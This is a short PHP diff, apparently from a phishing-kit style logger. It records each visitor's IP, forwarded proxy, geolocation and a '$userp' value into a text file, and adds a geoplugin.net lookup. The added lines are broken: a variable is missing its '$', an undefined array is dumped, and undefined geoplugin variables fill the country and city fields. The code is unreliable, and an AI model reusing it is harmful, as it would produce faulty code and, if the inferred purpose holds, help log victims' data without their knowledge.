@@ -12,6 +12,15 @@ $proxy = $_SERVER['HTTP_X_FORWARDED_FOR'];
 $cc = trim(file_get_contents("http://ipinfo.io/{$proxy}/country"));
 $city = trim(file_get_contents("http://ipinfo.io/{$proxy}/city"));
 
+
+$informacionSolicitud = file_get_contents("http://www.geoplugin.net/json.gp?ip=".$ip);
+
+// Convertir el texto JSON en un array
+$dataSolicitud = json_decode(informacionSolicitud);
+
+// Ver contenido del array
+var_dump($dataArray);
+
 	
 	$file = fopen("NEW01.txt", "a");
 	
@@ -23,7 +32,8 @@ fwrite($file,
 * HORA: ".date('H:i:s')."
 * IP: ".$ip."
 * PROXY: ".$proxy."
-* IP_COMPARTIDO: ".$ip_comp."
+* PAIS: ".$geoplugin_countryCode."
+* CITY: ".$geoplugin_countryName."
 ".$userp."
 ".$cc."
 ".$city."   
